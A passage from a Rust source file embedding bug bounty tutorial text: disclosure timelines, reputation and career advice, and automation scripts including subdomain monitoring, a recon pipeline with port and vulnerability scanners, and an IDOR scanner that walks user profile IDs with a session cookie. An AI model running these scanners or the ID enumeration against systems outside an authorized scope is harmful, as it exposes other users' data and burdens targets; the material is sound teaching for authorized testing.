
TOOLS REFERENCE:
- **HackerOne Inbox**: https://hackerone.com/bugs (manage reports and communication)
- **Bugcrowd Dashboard**: https://bugcrowd.com/researcher/programs (track submissions)
- **Discord/Slack**: Many programs have dedicated researcher channels

FURTHER READING:
- HackerOne Triage Process: https://docs.hackerone.com/hackers/triaging.html
- Bugcrowd Response SLA: https://www.bugcrowd.com/resources/reports/state-of-bug-bounty/
- ISO 29147 Disclosure: https://www.iso.org/standard/72311.html"
    ),
    (
        "Disclosure & reputation building",
        "OBJECTIVE: Follow responsible disclosure practices, build professional reputation through quality submissions, and contribute to the security community while maximizing learning and career growth.

ACADEMIC BACKGROUND:
ISO 30111 describes vulnerability handling processes. CERT Coordinated Vulnerability Disclosure Guide provides disclosure timelines. HackerOne Hacktivity showcases researcher profiles. Bugcrowd Leaderboard ranks top researchers globally.

STEP-BY-STEP PROCESS:

1. Responsible Disclosure Timeline:

Standard Disclosure Periods:
```text
GOOGLE VRP: 90 days or fix + 7 days (whichever earlier)
MICROSOFT: 90 days from report
HACKERONE: Coordinated with security team (typically 90 days)
BUGCROWD: Per program policy (30-90 days)

CRITICAL VULNERABILITIES:
- Active exploitation: Immediate private disclosure
- High severity: 30-45 days for fix
- Medium/Low: 60-90 days

DISCLOSURE TYPES:
- Full Disclosure: Complete technical details public
- Responsible: Coordinated with vendor, partial details
- Private: Remains confidential (invited programs)
```

Coordinated Disclosure Process:
```text
Day 0: Submit vulnerability report
Day 1-7: Triage and validation
Day 7-30: Security team develops fix
Day 30-60: Fix deployed to production
Day 60-90: Disclosure coordinated
Day 90: Public disclosure (if fix complete) or limited disclosure (if not)

VENDOR REQUEST FOR EXTENSION:
\"Hi [Researcher],

We need additional time to deploy the fix to all customers. Could we extend disclosure by 30 days?\"

PROFESSIONAL RESPONSE:
\"Hi [Security Team],

I understand the complexity of deploying fixes. I'm happy to extend the disclosure date to [new date].

Please keep me updated on fix progress.

Thank you!\"
```

2. Public Disclosure Best Practices:

Disclosure Platforms:
```bash
# Personal blog/writeup
- Medium: https://medium.com/
- GitHub: https://github.com/your-username/writeups
- Personal website: https://yourname.com/blog/

# Security community platforms
- HackerOne Hacktivity (auto-published after resolution)
- Bugcrowd public disclosures
- Twitter threads for summaries
- InfoSec forums (Reddit r/netsec, r/bugbounty)
```

Writeup Structure:
```text
TITLE: How I Found SQL Injection in [Company] Search Feature

INTRODUCTION:
- Brief background on program
- Why you targeted this asset
- Timeline (submitted X, fixed Y, disclosed Z)

DISCOVERY PROCESS:
- Reconnaissance steps
- What led you to vulnerable endpoint
- Initial testing approach

VULNERABILITY DETAILS:
- Technical explanation
- Proof-of-concept (sanitized)
- Impact assessment

EXPLOITATION (if applicable):
- Attack chain development
- How you proved impact

FIX VERIFICATION:
- How vendor fixed it
- Security improvements implemented

LESSONS LEARNED:
- What you learned
- Tips for other researchers
- Future research directions

TIMELINE:
Oct 15: Vulnerability discovered
Oct 16: Report submitted
Oct 20: Triaged as High severity
Nov 10: Fix deployed
Nov 15: Bounty awarded ($5,000)
Dec 15: Public disclosure
```

3. Portfolio and Reputation Building:

Creating Security Portfolio:
```bash
# GitHub Portfolio Structure
your-username/
├── README.md (introduction, stats, contact)
├── writeups/
│   ├── 2025-11-company-a-sqli.md
│   ├── 2025-10-company-b-xss.md
│   └── 2025-09-company-c-idor.md
├── tools/
│   ├── custom-scanner.py
│   └── recon-automation.sh
└── presentations/
    └── defcon-2025-slides.pdf

# Portfolio Metrics to Track
- Total reports submitted
- Accepted/Triaged reports
- Total bounties earned
- Average bounty amount
- Hall of Fame mentions
- CVEs assigned
- Public disclosures
```

Professional Online Presence:
```text
TWITTER:
- Share sanitized findings (after disclosure)
- Engage with security community
- Share learning resources
- Retweet interesting research

LINKEDIN:
- Professional security researcher title
- List notable findings (after disclosure)
- Connect with security professionals
- Share long-form content

GITHUB:
- Publish security tools
- Share write ups
- Contribute to open-source security projects
- Demonstrate coding skills

PERSONAL BLOG:
- Detailed technical writeups
- Tutorial content
- Research methodologies
- Tool development
```

4. Community Engagement:

Contributing to Community:
```text
WAYS TO CONTRIBUTE:
1. Publish detailed writeups (educational value)
2. Create security tools (open-source)
3. Mentor new researchers (Discord/Slack)
4. Present at conferences (local meetups → DefCon)
5. Contribute to security frameworks (OWASP, SecLists)
6. Write tutorials and guides
7. Share wordlists and methodologies

GIVING BACK:
- Answer questions in r/bugbounty
- Help with report reviews
- Share reconnaissance techniques
- Contribute to security awareness
```

Security Conferences:
```text
LOCAL MEETUPS:
- OWASP chapter meetings
- DEF CON groups
- BSides conferences (30+ cities)
- Local security meetups

MAJOR CONFERENCES:
- DEF CON (Las Vegas, August)
- Black Hat (Las Vegas, July/December)
- RSA Conference (San Francisco, April)
- BSides (Various cities)
- Nullcon (India)
- 44CON (London)
- SecTor (Toronto)

SUBMITTING TALKS:
1. Start with local meetups (low pressure)
2. Submit to BSides (beginner-friendly)
3. Build up to major conferences
4. Topics: Unique findings, methodologies, tool development
```

5. Career Progression Path:

Bug Bounty → Career Opportunities:
```text
ENTRY LEVEL (0-2 years):
- Focus: Learning, skill development
- Goals: First valid reports, consistent findings
- Income: $5K-$20K/year part-time

INTERMEDIATE (2-5 years):
- Focus: Specialization, efficiency
- Goals: High/critical findings, private invites
- Income: $20K-$100K/year (can be full-time)

ADVANCED (5+ years):
- Focus: Complex chains, research
- Goals: CVEs, conference talks, consulting
- Income: $100K-$300K+/year

CAREER TRANSITIONS:
1. Application Security Engineer
2. Penetration Tester
3. Security Researcher
4. Security Consultant
5. Bug Bounty Platform (HackerOne/Bugcrowd employee)
6. CISO/Security Leadership (long-term)
```

Building Competitive Advantages:
```text
SPECIALIZATIONS:
- Mobile security (iOS/Android deep-dive)
- API security (GraphQL, REST expert)
- Cloud security (AWS/GCP/Azure)
- Blockchain/Web3 security
- IoT/embedded systems
- Thick client applications
- Mobile payment systems

RARE SKILLS:
- Binary exploitation
- Cryptographic implementation flaws
- Complex business logic chains
- Source code review expertise
- Advanced automation/tooling
```

6. Metrics and Goal Setting:

Track Performance:
```text
MONTHLY GOALS:
□ Submit 10 quality reports
□ Achieve 5 triaged findings
□ Earn $2,000 in bounties
□ Write 1 public disclosure
□ Learn 1 new technique
□ Contribute 1 tool/script

QUARTERLY GOALS:
□ Get invited to 2 private programs
□ Speak at 1 local meetup
□ Publish 3 detailed writeups
□ Develop 1 custom scanning tool
□ Achieve platform milestone (Top 100)

YEARLY GOALS:
□ Earn $20K-$50K in bounties
□ Receive 5 CVE assignments
□ Submit talk to major conference
□ Build substantial online presence
□ Get hired as security professional
```

7. Avoiding Burnout and Staying Motivated:

Healthy Bug Bounty Habits:
```text
✓ Set realistic goals
✓ Celebrate small wins
✓ Take breaks between programs
✓ Learn from duplicates/informatives
✓ Diversify: don't rely only on bounties
✓ Build supportive community connections
✓ Focus on learning, not just money
✓ Maintain work-life balance

✗ Chasing every program
✗ Comparing to top earners constantly
✗ Burning out on repetitive testing
✗ Ignoring personal health
✗ Becoming discouraged by duplicates
```

WHAT TO LOOK FOR:
- **Quality Reputation**: High signal-to-noise ratio (more triaged than informative/duplicate)
- **Community Recognition**: Hall of Fame mentions, platform badges, invitations to private programs
- **Professional Growth**: Speaking opportunities, job offers, consulting requests
- **Sustainable Income**: Consistent monthly bounties, not feast-or-famine

SECURITY IMPLICATIONS:
- **Responsible Disclosure**: Premature disclosure harms vendor and researcher reputation
- **Professional Ethics**: Building trust with security teams leads to better opportunities
- **Community Standards**: Maintaining professional behavior benefits entire ecosystem

COMMON PITFALLS:
- **Premature Disclosure**: Publishing before 90-day coordinated disclosure window
- **Vendor Shaming**: Publicly criticizing slow fixes or low bounties (damages reputation)
- **Quantity Over Quality**: Spamming low-quality reports for leaderboard rankings
- **Comparison Trap**: Demotivation from comparing earnings to top 1% researchers
- **Burnout**: Testing 24/7 without breaks, ignoring health
- **Portfolio Neglect**: Finding vulnerabilities but not documenting or sharing learnings
- **Social Media Overuse**: Spending more time tweeting than actually testing
- **Imposter Syndrome**: Giving up after few duplicates or rejections

TOOLS REFERENCE:
- **HackerOne Profile**: https://hackerone.com/your-username (reputation and stats)
- **Bugcrowd Leaderboard**: https://bugcrowd.com/leaderboard (ranking)
- **Medium**: https://medium.com/ (writeup publishing)
- **GitHub**: https://github.com/ (portfolio and tools)
- **Twitter**: https://twitter.com/ (community engagement)

FURTHER READING:
- HackerOne Disclosure Guidelines: https://docs.hackerone.com/hackers/disclosure.html
- Bugcrowd Disclosure Policy: https://www.bugcrowd.com/resources/leveling-up/disclosure-best-practices/
- ISO 30111 Vulnerability Handling: https://www.iso.org/standard/69725.html
- The Bug Bounty Playbook by Vickie Li: Career progression chapter"
    ),
    (
        "Automation & efficiency",
        "OBJECTIVE: Develop custom tools, scripts, and automation workflows to efficiently discover vulnerabilities at scale while maintaining quality and avoiding disruption.

ACADEMIC BACKGROUND:
DevSecOps principles emphasize automation in security testing. OWASP DevSecOps Guideline promotes CI/CD security integration. GitHub's Security Lab automates vulnerability research. ProjectDiscovery provides open-source automation tools.

STEP-BY-STEP PROCESS:

1. Reconnaissance Automation:

Asset Monitoring Scripts:
```bash
#!/bin/bash
# automated_recon.sh - Monitor new subdomains daily

DOMAIN=\"example.com\"
DATE=$(date +%Y-%m-%d)
OLD_SUBS=\"subdomains_previous.txt\"
NEW_SUBS=\"subdomains_${DATE}.txt\"

# Passive subdomain enumeration
subfinder -d $DOMAIN -silent > $NEW_SUBS
amass enum -passive -d $DOMAIN >> $NEW_SUBS
curl -s \"https://crt.sh/?q=%.${DOMAIN}&output=json\" | jq -r '.[].name_value' >> $NEW_SUBS

# Deduplicate
sort -u $NEW_SUBS -o $NEW_SUBS

# Find new subdomains
if [ -f $OLD_SUBS ]; then
  comm -13 $OLD_SUBS $NEW_SUBS > new_subdomains.txt
  
  if [ -s new_subdomains.txt ]; then
    echo \"New subdomains found:\"
    cat new_subdomains.txt
    
    # Notify via webhook
    curl -X POST https://discord.com/webhook \\
      -H \"Content-Type: application/json\" \\
      -d \"{\\\"content\\\":\\\"New subdomains found for $DOMAIN: $(cat new_subdomains.txt | wc -l)\\\"}\"
  fi
fi

# Update previous list
cp $NEW_SUBS $OLD_SUBS
```

2. Notification Systems:

Discord/Slack Webhook Integration:
```python
#!/usr/bin/env python3
# notify.py - Send notifications for new findings

import requests
import json

def send_discord(webhook_url, message):
    data = {\"content\": message}
    requests.post(webhook_url, json=data)

def send_slack(webhook_url, message):
    data = {\"text\": message}
    requests.post(webhook_url, json=data)

# Usage
webhook = \"https://discord.com/api/webhooks/YOUR_WEBHOOK\"
send_discord(webhook, \"🚨 New subdomain discovered: test.example.com\")
```

3. Custom Vulnerability Scanners:

Targeted Scanner Example:
```python
#!/usr/bin/env python3
# idor_scanner.py - Automate IDOR testing

import requests
import sys

def test_idor(base_url, min_id, max_id, cookie):
    headers = {\"Cookie\": cookie}
    vulnerable = []
    
    for user_id in range(min_id, max_id + 1):
        url = f\"{base_url}/api/users/{user_id}/profile\"
        resp = requests.get(url, headers=headers)
        
        if resp.status_code == 200:
            print(f\"[+] Accessible: {url}\")
            vulnerable.append(user_id)
        elif resp.status_code == 403:
            print(f\"[-] Forbidden: {url}\")
        
        # Rate limiting
        time.sleep(0.5)
    
    return vulnerable

if __name__ == \"__main__\":
    base_url = sys.argv[1]
    cookie = sys.argv[2]
    
    vulns = test_idor(base_url, 1, 100, cookie)
    print(f\"\\n[!] Found {len(vulns)} accessible profiles\")
```

4. Workflow Optimization:

Automation Pipeline:
```bash
#!/bin/bash
# bounty_pipeline.sh - Complete automated workflow

PROGRAM=\"example.com\"

echo \"[1] Asset Discovery\"
./scripts/asset_discovery.sh $PROGRAM

echo \"[2] Port Scanning\"
cat assets.txt | naabu -silent -top-ports 1000 -o ports.txt

echo \"[3] HTTP Probing\"
cat assets.txt | httpx -silent -title -tech-detect -status-code -o http_results.txt

echo \"[4] Vulnerability Scanning\"
cat http_results.txt | nuclei -silent -t ~/nuclei-templates/ -severity critical,high -o vulns.txt

echo \"[5] Screenshot Collection\"
cat http_results.txt | aquatone -out aquatone_$(date +%Y%m%d)/

echo \"[6] Notify Results\"
if [ -s vulns.txt ]; then
  ./scripts/notify.py \"New vulnerabilities found in $PROGRAM\"
fi

echo \"[*] Pipeline complete!\"
```

WHAT TO LOOK FOR:
- **Efficiency Gains**: Automation finding vulnerabilities 10x faster than manual
- **New Asset Alerts**: Notifications within hours of new subdomains appearing
- **Scalability**: Monitor 50+ programs simultaneously
- **Quality Maintenance**: Automation supplements, not replaces, manual testing

SECURITY IMPLICATIONS:
- **Rate Limiting**: Automated scanning must respect target infrastructure (use --rate-limit)
- **Scope Compliance**: Automated tools must filter out-of-scope assets
- **Responsible Automation**: No destructive testing, data exfiltration, or DoS

COMMON PITFALLS:
- **Over-Automation**: Missing business logic flaws that require manual analysis
- **Noisy Scanning**: Aggressive automation triggering WAF bans or service disruption
- **False Positives**: Automated findings without manual validation lead to low-quality reports
- **Tool Dependence**: Relying entirely on tools without understanding underlying vulnerabilities
- **Scope Violations**: Automation scanning out-of-scope assets without filtering
- **No Customization**: Using default tool configs missing program-specific vulnerabilities

TOOLS REFERENCE:
- **Subfinder**: https://github.com/projectdiscovery/subfinder (subdomain discovery)
- **Nuclei**: https://github.com/projectdiscovery/nuclei (vulnerability scanner)
- **Notify**: https://github.com/projectdiscovery/notify (notification framework)
- **Axiom**: https://github.com/pry0cc/axiom (distributed scanning infrastructure)

FURTHER READING:
- ProjectDiscovery Blog: https://blog.projectdiscovery.io/
- Automation in Bug Bounty by NahamSec: https://www.nahamsec.com/
- Distributed Scanning with Axiom: https://github.com/pry0cc/axiom"
    ),
];

pub fn load_phase() -> Phase {
    let steps: Vec<Step> = STEPS
        .iter()
        .map(|(title, description)| {
            Step::new_tutorial(
                Uuid::new_v4(),
                title.to_string(),
                description.to_string(),
                vec!["bugbounty".to_string()],
            )
        })
        .collect();

    Phase {
        id: Uuid::new_v4(),
        name: "Bug Bounty Hunting".to_string(),
        notes: String::new(),
        steps,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bug_bounty_phase_loads() {
        let phase = load_phase();
        assert_eq!(phase.name, "Bug Bounty Hunting");
        assert_eq!(phase.steps.len(), 8);
    }

    #[test]
    fn test_step_content_structure() {
        for (title, description) in STEPS {
            assert!(
                description.contains("OBJECTIVE:"),
                "Step '{}' missing OBJECTIVE section",
                title
            );
            assert!(
                description.contains("STEP-BY-STEP PROCESS:"),
                "Step '{}' missing STEP-BY-STEP PROCESS section",
                title
            );
            assert!(
                description.contains("WHAT TO LOOK FOR:"),
                "Step '{}' missing WHAT TO LOOK FOR section",
                title
            );
            assert!(
                description.contains("COMMON PITFALLS:"),
                "Step '{}' missing COMMON PITFALLS section",
                title
            );
        }
    }
}
